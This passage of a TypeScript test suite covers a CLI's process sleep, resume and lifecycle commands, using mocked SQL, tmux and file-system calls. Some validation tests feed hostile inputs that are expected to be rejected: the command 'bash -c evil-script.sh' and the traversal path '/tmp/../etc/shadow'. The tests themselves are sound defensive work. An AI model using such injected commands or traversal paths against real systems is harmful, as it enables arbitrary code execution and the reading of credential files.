      channel_id: null, skill_resource_id: null, name: 'test-proc',
      parent_process_id: null, branch: null, training_resource_id: null, run_type: null,
    }])

    const cmd = processCommand()
    await cmd.parseAsync(['sleep', '--interval', '30 minutes'], { from: 'user' })

    expect(errors.join('\n')).toContain('disallowed shell characters')
    expect(process.exitCode).toBe(1)

    delete process.env.LOOP_CMD
  })
})

describe('process resume', () => {
  let logs: string[]
  let errors: string[]
  const processId = '550e8400-e29b-41d4-a716-446655440000'

  beforeEach(() => {
    fakeSql.mockReset()
    fakeExecFileSync.mockReset()
    // Default: git returns a branch name, tmux succeeds
    fakeExecFileSync.mockImplementation((cmd: string) => {
      if (cmd === 'git') return 'test-branch\n'
      return ''
    })
    setAdapter(new PostgresOntologyAdapter())
    logs = []
    errors = []
    vi.spyOn(console, 'log').mockImplementation((...args) => logs.push(args.join(' ')))
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(args.join(' ')))
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => {
      const line = String(chunk)
      if (line.includes('[ERROR]') || line.includes('[WARN]')) errors.push(line)
      return true
    })
    process.exitCode = undefined
    // Clear env vars
    delete process.env.EVAL_PROCESS_ID
    delete process.env.WORKTREE_PATH
  })

  afterEach(() => {
    clearAdapter()
    delete process.env.EVAL_PROCESS_ID
    delete process.env.WORKTREE_PATH
    vi.restoreAllMocks()
  })

  it('resumes a waiting process with valid resume_context', async () => {
    const worktreePath = fs.mkdtempSync(path.join(os.tmpdir(), 'resume-test-'))
    const workspaceDir = path.join(worktreePath, 'workspace')
    fs.mkdirSync(workspaceDir, { recursive: true })
    fs.writeFileSync(path.join(workspaceDir, 'state.json'), JSON.stringify({ epoch: 3 }))

    const resumeCtx = JSON.stringify({
      worktree_path: worktreePath,
      loop_cmd: 'npx tsx utils/loop/index.ts --goal-file workspace/goal.md',
      epoch: 3,
    })

    // dbGetProcessById
    fakeSql.mockResolvedValueOnce([{
      id: processId,
      name: 'test-resume',
      status: 'waiting',
      resume_context: resumeCtx,
    }])
    // atomic claim UPDATE
    fakeSql.mockResolvedValueOnce([{ id: processId }])

    const cmd = processCommand()
    await cmd.parseAsync(['resume', '--id', processId], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(logs.join('\n')).toContain('resumed process')

    // Verify wake_notes was written
    const state = JSON.parse(fs.readFileSync(path.join(workspaceDir, 'state.json'), 'utf-8'))
    expect(state.wake_notes).toHaveLength(1)
    expect(state.wake_notes[0].epoch).toBe(3)
    expect(state.wake_notes[0].resumed_at).toBeDefined()

    // Verify no .running.pid file was written
    expect(fs.existsSync(path.join(workspaceDir, '.running.pid'))).toBe(false)

    // Verify tmux new-session was called correctly with EVAL_PROCESS_ID injected via -e flag
    // (No 3rd options arg — env vars are injected via tmux -e flags, not execFileSync env option)
    expect(fakeExecFileSync).toHaveBeenCalledWith(
      'tmux',
      expect.arrayContaining(['new-session', '-d', '-s', expect.stringMatching(/^resume-/), '-e', `EVAL_PROCESS_ID=${processId}`, '-c', worktreePath]),
    )

    fs.rmSync(worktreePath, { recursive: true, force: true })
  })

  it('wake-scheduler correctly resumes segment 2 when root has 2 segments', async () => {
    // Simulates the linked-segment scenario from Story 3/4:
    //   segment1_id: status='completed' (the original sleep segment)
    //   segment2_id: status='waiting'   (the new segment created by dbSleepProcess)
    // The wake-scheduler queries WHERE status='waiting' → gets segment2_id.
    // process resume --id <segment2_id> must spawn with EVAL_PROCESS_ID = segment2_id.

    const segment1Id = '11111111-1111-1111-1111-111111111111'
    const segment2Id = '22222222-2222-2222-2222-222222222222'

    const worktreePath = fs.mkdtempSync(path.join(os.tmpdir(), 'resume-seg2-'))
    const workspaceDir = path.join(worktreePath, 'workspace')
    fs.mkdirSync(workspaceDir, { recursive: true })
    fs.writeFileSync(path.join(workspaceDir, 'state.json'), JSON.stringify({ epoch: 5 }))

    const resumeCtx = JSON.stringify({
      worktree_path: worktreePath,
      loop_cmd: 'npx tsx utils/loop/index.ts --goal-file workspace/goal.md',
      epoch: 5,
    })

    // Wake-scheduler passes segment2Id to `process resume --id`.
    // dbGetProcessById(segment2Id) → returns segment 2 (waiting)
    fakeSql.mockResolvedValueOnce([{
      id: segment2Id,
      name: 'test-linked-seg2',
      status: 'waiting',
      resume_context: resumeCtx,
    }])
    // atomic claim UPDATE for segment2Id
    fakeSql.mockResolvedValueOnce([{ id: segment2Id }])

    // Simulate what wake-scheduler does: call `process resume --id <segment2Id>`
    const cmd = processCommand()
    await cmd.parseAsync(['resume', '--id', segment2Id], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(logs.join('\n')).toContain('resumed process')

    // Segment 1 (completed) is never involved — EVAL_PROCESS_ID must be segment2Id, not segment1Id
    // EVAL_PROCESS_ID is injected via tmux -e flag, not execFileSync env option
    expect(fakeExecFileSync).toHaveBeenCalledWith(
      'tmux',
      expect.arrayContaining(['-e', `EVAL_PROCESS_ID=${segment2Id}`]),
    )
    expect(fakeExecFileSync).not.toHaveBeenCalledWith(
      'tmux',
      expect.arrayContaining(['-e', `EVAL_PROCESS_ID=${segment1Id}`]),
    )

    fs.rmSync(worktreePath, { recursive: true, force: true })
  })

  it('exits 0 when process is not waiting', async () => {
    // dbGetProcessById returns active process
    fakeSql.mockResolvedValueOnce([{
      id: processId,
      name: 'test-active',
      status: 'active',
      resume_context: null,
    }])

    const cmd = processCommand()
    await cmd.parseAsync(['resume', '--id', processId], { from: 'user' })

    expect(logs.join('\n')).toContain('not waiting')
    expect(process.exitCode).not.toBe(1)
  })

  it('fails process when resume_context missing worktree_path', async () => {
    const resumeCtx = JSON.stringify({ loop_cmd: 'echo hello', epoch: 1 })

    // dbGetProcessById
    fakeSql.mockResolvedValueOnce([{
      id: processId,
      name: 'test-bad-ctx',
      status: 'waiting',
      resume_context: resumeCtx,
    }])
    // dbFailProcess (with reason — tryUpdateWithColumnFallback first attempt)
    fakeSql.mockResolvedValueOnce([{ id: processId }])

    const cmd = processCommand()
    await cmd.parseAsync(['resume', '--id', processId], { from: 'user' })

    expect(process.exitCode).toBe(1)
  })

  it('fails process when worktree does not exist', async () => {
    const resumeCtx = JSON.stringify({
      worktree_path: '/tmp/nonexistent-worktree-path-xyz',
      loop_cmd: 'npx tsx utils/loop/index.ts --goal-file workspace/goal.md',
      epoch: 1,
    })

    // dbGetProcessById
    fakeSql.mockResolvedValueOnce([{
      id: processId,
      name: 'test-no-wt',
      status: 'waiting',
      resume_context: resumeCtx,
    }])
    // dbFailProcess
    fakeSql.mockResolvedValueOnce([{ id: processId }])

    const cmd = processCommand()
    await cmd.parseAsync(['resume', '--id', processId], { from: 'user' })

    expect(process.exitCode).toBe(1)
  })

  it('exits 0 when atomic claim returns rowCount 0 (already claimed)', async () => {
    const worktreePath = fs.mkdtempSync(path.join(os.tmpdir(), 'resume-claim-'))
    fs.mkdirSync(path.join(worktreePath, 'workspace'), { recursive: true })

    const resumeCtx = JSON.stringify({
      worktree_path: worktreePath,
      loop_cmd: 'npx tsx utils/loop/index.ts --goal-file workspace/goal.md',
      epoch: 1,
    })

    // dbGetProcessById
    fakeSql.mockResolvedValueOnce([{
      id: processId,
      name: 'test-claimed',
      status: 'waiting',
      resume_context: resumeCtx,
    }])
    // atomic claim returns empty (already claimed)
    fakeSql.mockResolvedValueOnce([])

    const cmd = processCommand()
    await cmd.parseAsync(['resume', '--id', processId], { from: 'user' })

    expect(logs.join('\n')).toContain('already claimed')
    expect(process.exitCode).not.toBe(1)

    fs.rmSync(worktreePath, { recursive: true, force: true })
  })

  it('errors when --id is missing and EVAL_PROCESS_ID not set', async () => {
    const cmd = processCommand()
    await cmd.parseAsync(['resume'], { from: 'user' })

    expect(errors.join('\n')).toContain('required')
    expect(process.exitCode).toBe(1)
  })

  it('fails process when loop_cmd does not start with expected prefix', async () => {
    const worktreePath = fs.mkdtempSync(path.join(os.tmpdir(), 'resume-bad-cmd-'))
    const resumeCtx = JSON.stringify({
      worktree_path: worktreePath,
      loop_cmd: 'bash -c evil-script.sh',
      epoch: 1,
    })

    // dbGetProcessById
    fakeSql.mockResolvedValueOnce([{
      id: processId,
      name: 'test-bad-cmd',
      status: 'waiting',
      resume_context: resumeCtx,
    }])
    // dbFailProcess
    fakeSql.mockResolvedValueOnce([{ id: processId }])

    const cmd = processCommand()
    await cmd.parseAsync(['resume', '--id', processId], { from: 'user' })

    expect(process.exitCode).toBe(1)

    fs.rmSync(worktreePath, { recursive: true, force: true })
  })

  it('fails process when resume_context contains invalid JSON', async () => {
    fakeSql.mockResolvedValueOnce([{
      id: processId,
      name: 'test-bad-json',
      status: 'waiting',
      resume_context: '{invalid json!!!',
    }])
    // dbFailProcess
    fakeSql.mockResolvedValueOnce([{ id: processId }])

    const cmd = processCommand()
    await cmd.parseAsync(['resume', '--id', processId], { from: 'user' })

    expect(process.exitCode).toBe(1)
  })

  it('fails process when worktree_path contains path traversal sequences', async () => {
    const resumeCtx = JSON.stringify({
      worktree_path: '/tmp/../etc/shadow',
      loop_cmd: 'npx tsx utils/loop/index.ts --goal-file workspace/goal.md',
      epoch: 1,
    })
    fakeSql.mockResolvedValueOnce([{
      id: processId,
      name: 'test-traversal',
      status: 'waiting',
      resume_context: resumeCtx,
    }])
    // dbFailProcess
    fakeSql.mockResolvedValueOnce([{ id: processId }])

    const cmd = processCommand()
    await cmd.parseAsync(['resume', '--id', processId], { from: 'user' })

    expect(process.exitCode).toBe(1)
  })

  it('fails process when worktree_path is a relative path', async () => {
    const resumeCtx = JSON.stringify({
      worktree_path: 'relative/path/to/worktree',
      loop_cmd: 'npx tsx utils/loop/index.ts --goal-file workspace/goal.md',
      epoch: 1,
    })
    fakeSql.mockResolvedValueOnce([{
      id: processId,
      name: 'test-relative-path',
      status: 'waiting',
      resume_context: resumeCtx,
    }])
    // dbFailProcess
    fakeSql.mockResolvedValueOnce([{ id: processId }])

    const cmd = processCommand()
    await cmd.parseAsync(['resume', '--id', processId], { from: 'user' })

    expect(process.exitCode).toBe(1)
  })
})

describe('non-regression: process lifecycle without sleep', () => {
  let logs: string[]
  let errors: string[]
  const processId = '550e8400-e29b-41d4-a716-446655440000'

  beforeEach(() => {
    fakeSql.mockReset()
    setAdapter(new PostgresOntologyAdapter())
    logs = []
    errors = []
    vi.spyOn(console, 'log').mockImplementation((...args) => logs.push(args.join(' ')))
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(args.join(' ')))
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => {
      const line = String(chunk)
      if (line.includes('[ERROR]') || line.includes('[WARN]')) errors.push(line)
      return true
    })
    process.exitCode = undefined
  })

  afterEach(() => {
    clearAdapter()
    vi.restoreAllMocks()
  })

  it('init → activate → complete produces single segment with correct fields', async () => {
    // Mock init INSERT (no getByName call — initProcess is a straight INSERT path)
    fakeSql
      .mockResolvedValueOnce([{ id: processId }])

    const cmd1 = processCommand()
    await cmd1.parseAsync(['init', '--name', 'nonreg-test', '--unlinked'], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)
    expect(logs.join('\n')).toContain(processId)

    // Verify init SQL contains INSERT INTO processes (calls[0] is init INSERT)
    const initCall = fakeSql.mock.calls[0]
    const initSqlText = initCall[0].join(' ')
    expect(initSqlText).toContain('INSERT INTO processes')

    // Reset for activate
    fakeSql.mockReset()
    process.exitCode = undefined

    // Mock activate UPDATE
    fakeSql.mockResolvedValueOnce([{ id: processId }])

    const cmd2 = processCommand()
    await cmd2.parseAsync(['active', '--id', processId], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)

    // Verify activate SQL sets started_at = NOW()
    const activateCall = fakeSql.mock.calls[0]
    const activateSqlText = activateCall[0].join(' ')
    expect(activateSqlText).toContain('started_at = NOW()')

    // Reset for complete
    fakeSql.mockReset()
    process.exitCode = undefined

    // Mock complete UPDATE (tryUpdateWithColumnFallback — first attempt succeeds)
    fakeSql.mockResolvedValueOnce([{ id: processId }])

    const cmd3 = processCommand()
    await cmd3.parseAsync(['complete', '--id', processId], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)

    // Verify complete SQL sets completed_at = NOW()
    const completeCall = fakeSql.mock.calls[0]
    const completeSqlText = completeCall[0].join(' ')
    expect(completeSqlText).toContain('completed_at = NOW()')
  })

  it('init → activate → fail produces correct status', async () => {
    // Mock init INSERT (no getByName call — initProcess is a straight INSERT path)
    fakeSql
      .mockResolvedValueOnce([{ id: processId }])

    const cmd1 = processCommand()
    await cmd1.parseAsync(['init', '--name', 'nonreg-test', '--unlinked'], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)

    // Reset for activate
    fakeSql.mockReset()
    process.exitCode = undefined

    // Mock activate UPDATE
    fakeSql.mockResolvedValueOnce([{ id: processId }])

    const cmd2 = processCommand()
    await cmd2.parseAsync(['active', '--id', processId], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)

    // Reset for fail
    fakeSql.mockReset()
    process.exitCode = undefined

    // Mock fail UPDATE (no reason — direct SQL, not tryUpdateWithColumnFallback)
    fakeSql.mockResolvedValueOnce([{ id: processId }])

    const cmd3 = processCommand()
    await cmd3.parseAsync(['fail', '--id', processId], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)

    // Verify fail SQL sets status='failed'
    const failCall = fakeSql.mock.calls[0]
    const failSqlText = failCall[0].join(' ')
    expect(failSqlText).toContain("status = 'failed'")

    // Verify root_process_id is NOT explicitly set in any UPDATE
    // (the DB trigger handles it on INSERT only)
    expect(failSqlText).not.toContain('root_process_id')
  })

  it('init SQL does NOT explicitly set root_process_id (trigger handles it)', async () => {
    // Mock init INSERT (no getByName call — initProcess is a straight INSERT path)
    fakeSql
      .mockResolvedValueOnce([{ id: processId }])

    const cmd = processCommand()
    await cmd.parseAsync(['init', '--name', 'nonreg-test', '--unlinked'], { from: 'user' })

    expect(process.exitCode).not.toBe(1)
    expect(errors).toHaveLength(0)

    // Inspect the SQL template call — calls[0] is the INSERT (no preceding getByName)
    const initCall = fakeSql.mock.calls[0]
    const initSqlText = initCall[0].join(' ')
    expect(initSqlText).toContain('INSERT INTO processes')
    expect(initSqlText).not.toContain('root_process_id')
  })
})

// ── readLocalProject / writeLocalProject ─────────────────────────────────────

const FAKE_PROJECT_PATH = '/fake-home/.config/duoidal/project.json'

describe('readLocalProject (via initProcess fallback)', () => {
  let logs: string[]
  let errors: string[]

  beforeEach(() => {
    fakeSql.mockReset()
    setAdapter(new PostgresOntologyAdapter())
    fakeGetLocalSubUnchecked.mockReturnValue(null)
    fakeReadFileSync.mockReset()
    fakeReadFileSync.mockImplementation((filePath: unknown) => {
      throw Object.assign(new Error(`ENOENT: ${String(filePath)}`), { code: 'ENOENT' })
    })
    logs = []
    errors = []
    vi.spyOn(console, 'log').mockImplementation((...args) => logs.push(args.join(' ')))
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(args.join(' ')))
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => {
      const line = String(chunk)
      if (line.includes('[ERROR]') || line.includes('[WARN]')) errors.push(line)
      return true
    })
    process.exitCode = undefined
  })

  afterEach(() => {
    clearAdapter()
    // Restore real fs implementations so other test suites using real fs work correctly
    fakeReadFileSync.mockImplementation((...args) => realReadFileSync(...args as Parameters<typeof realReadFileSync>))
    fakeGetLocalSubUnchecked.mockReturnValue(null)
    vi.restoreAllMocks()
  })

  it('returns null when project.json does not exist', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeSql
      .mockResolvedValueOnce([{ id: processId }]) // init INSERT

    // fakeReadFileSync already throws ENOENT for all paths (set in beforeEach)
    const cmd = processCommand()
    await cmd.parseAsync(['init', '--name', 'test-no-project', '--unlinked'], { from: 'user' })

    expect(logs.join('\n')).toContain(processId)
    // No UUID other than processId should be in the SQL interpolated values (calls[0] is init INSERT)
    const initCall = fakeSql.mock.calls[0]
    const projectIdArg = initCall.find((v: unknown) => typeof v === 'string' && /^[0-9a-f]{8}-/.test(v) && v !== processId)
    expect(projectIdArg).toBeUndefined()
  })

  it('reads project_id from project.json when file exists', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    const projectId = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee'
    fakeSql
      .mockResolvedValueOnce([{ id: processId }]) // init INSERT

    fakeReadFileSync.mockImplementation((filePath: unknown) => {
      if (filePath === FAKE_PROJECT_PATH) {
        return JSON.stringify({ id: projectId, name: 'my-project' })
      }
      throw Object.assign(new Error(`ENOENT: ${String(filePath)}`), { code: 'ENOENT' })
    })

    const cmd = processCommand()
    await cmd.parseAsync(['init', '--name', 'test-with-project', '--unlinked'], { from: 'user' })

    expect(logs.join('\n')).toContain(processId)
    // The projectId should be passed as interpolated value to SQL (calls[0] is init INSERT)
    const initCall = fakeSql.mock.calls[0]
    const interpolatedValues = initCall.slice(1)
    expect(interpolatedValues).toContain(projectId)
  })
})

describe('writeLocalProject (via initProcess DB fallback)', () => {
  let logs: string[]
  let errors: string[]

  beforeEach(() => {
    fakeSql.mockReset()
    setAdapter(new PostgresOntologyAdapter())
    fakeGetLocalSubUnchecked.mockReturnValue(null)
    fakeReadFileSync.mockReset()
    fakeReadFileSync.mockImplementation((filePath: unknown) => {
      throw Object.assign(new Error(`ENOENT: ${String(filePath)}`), { code: 'ENOENT' })
    })
    fakeMkdirSync.mockReset()
    fakeMkdirSync.mockReturnValue(undefined)
    fakeWriteFileSync.mockReset()
    fakeWriteFileSync.mockReturnValue(undefined)
    fakeRenameSync.mockReset()
    fakeRenameSync.mockReturnValue(undefined)
    logs = []
    errors = []
    vi.spyOn(console, 'log').mockImplementation((...args) => logs.push(args.join(' ')))
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(args.join(' ')))
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => {
      const line = String(chunk)
      if (line.includes('[ERROR]') || line.includes('[WARN]')) errors.push(line)
      return true
    })
    process.exitCode = undefined
  })

  afterEach(() => {
    clearAdapter()
    // Restore real fs implementations so other test suites using real fs work correctly
    fakeReadFileSync.mockImplementation((...args) => realReadFileSync(...args as Parameters<typeof realReadFileSync>))
    fakeMkdirSync.mockImplementation((...args) => realMkdirSync(...args as Parameters<typeof realMkdirSync>))
    fakeWriteFileSync.mockImplementation((...args) => realWriteFileSync(...args as Parameters<typeof realWriteFileSync>))
    fakeRenameSync.mockImplementation((...args) => realRenameSync(...args as Parameters<typeof realRenameSync>))
    fakeGetLocalSubUnchecked.mockReturnValue(null)
    vi.restoreAllMocks()
  })

  it('writes project.json after DB lookup and caches result', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    const projectId = 'ffffffff-0000-1111-2222-333333333333'
    const sub = 'user|lookup-test'

    fakeGetLocalSubUnchecked.mockReturnValue(sub)

    // DB returns: resolveDefaultProject result, then init process result (no getByName)
    fakeSql
      .mockResolvedValueOnce([{ id: projectId, name: 'resolved-project' }]) // resolveDefaultProject
      .mockResolvedValueOnce([{ id: processId }])                             // processesService.init

    const cmd = processCommand()
    await cmd.parseAsync(['init', '--name', 'test-db-lookup', '--unlinked'], { from: 'user' })

    expect(logs.join('\n')).toContain(processId)

    // writeLocalProject should have been called — mkdirSync + writeFileSync + renameSync
    expect(fakeMkdirSync).toHaveBeenCalledWith(
      path.dirname(FAKE_PROJECT_PATH),
      expect.objectContaining({ recursive: true })
    )
    expect(fakeWriteFileSync).toHaveBeenCalledWith(
      FAKE_PROJECT_PATH + '.tmp',
      expect.stringContaining(projectId),
      expect.objectContaining({ mode: 0o600 })
    )
    expect(fakeRenameSync).toHaveBeenCalledWith(FAKE_PROJECT_PATH + '.tmp', FAKE_PROJECT_PATH)
  })
})

describe('initProcess project_id fallback chain', () => {
  let logs: string[]
  let errors: string[]

  beforeEach(() => {
    fakeSql.mockReset()
    setAdapter(new PostgresOntologyAdapter())
    fakeGetLocalSubUnchecked.mockReturnValue(null)
    fakeReadFileSync.mockReset()
    fakeReadFileSync.mockImplementation((filePath: unknown) => {
      throw Object.assign(new Error(`ENOENT: ${String(filePath)}`), { code: 'ENOENT' })
    })
    fakeMkdirSync.mockReset()
    fakeWriteFileSync.mockReset()
    fakeRenameSync.mockReset()
    logs = []
    errors = []
    vi.spyOn(console, 'log').mockImplementation((...args) => logs.push(args.join(' ')))
    vi.spyOn(console, 'error').mockImplementation((...args) => errors.push(args.join(' ')))
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => {
      const line = String(chunk)
      if (line.includes('[ERROR]') || line.includes('[WARN]')) errors.push(line)
      return true
    })
    process.exitCode = undefined
  })

  afterEach(() => {
    clearAdapter()
    // Restore real fs implementations so other test suites using real fs work correctly
    fakeReadFileSync.mockImplementation((...args) => realReadFileSync(...args as Parameters<typeof realReadFileSync>))
    fakeMkdirSync.mockImplementation((...args) => realMkdirSync(...args as Parameters<typeof realMkdirSync>))
    fakeWriteFileSync.mockImplementation((...args) => realWriteFileSync(...args as Parameters<typeof realWriteFileSync>))
    fakeRenameSync.mockImplementation((...args) => realRenameSync(...args as Parameters<typeof realRenameSync>))
    fakeGetLocalSubUnchecked.mockReturnValue(null)
    vi.restoreAllMocks()
  })

  it('uses --project-id flag when provided (skips file read)', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    const projectId = 'cccccccc-dddd-eeee-ffff-000000000000'
    fakeSql
      .mockResolvedValueOnce([{ id: processId }]) // init INSERT

    const cmd = processCommand()
    await cmd.parseAsync(
      ['init', '--name', 'test-explicit-project', '--unlinked', '--project-id', projectId],
      { from: 'user' }
    )

    expect(logs.join('\n')).toContain(processId)
    // fakeReadFileSync should NOT have been called for project.json
    const projectFileReads = fakeReadFileSync.mock.calls.filter(
      ([filePath]) => filePath === FAKE_PROJECT_PATH
    )
    expect(projectFileReads).toHaveLength(0)

    // projectId should be in the SQL interpolated values (calls[0] is init INSERT — no getByName)
    const initCall = fakeSql.mock.calls[0]
    const interpolatedValues = initCall.slice(1)
    expect(interpolatedValues).toContain(projectId)
  })

  it('succeeds with null project_id when no auth and no file (graceful)', async () => {
    const processId = '550e8400-e29b-41d4-a716-446655440000'
    fakeGetLocalSubUnchecked.mockReturnValue(null)
    fakeSql
      .mockResolvedValueOnce([{ id: processId }]) // init INSERT

    // fakeReadFileSync already throws ENOENT (set in beforeEach)

    const cmd = processCommand()
    await cmd.parseAsync(['init', '--name', 'test-no-auth', '--unlinked'], { from: 'user' })

    expect(logs.join('\n')).toContain(processId)
    expect(process.exitCode).not.toBe(1)
    // No error logged about project_id resolution failure
    const projectErrors = errors.filter(e => e.includes('project_id'))
    expect(projectErrors).toHaveLength(0)
  })
})
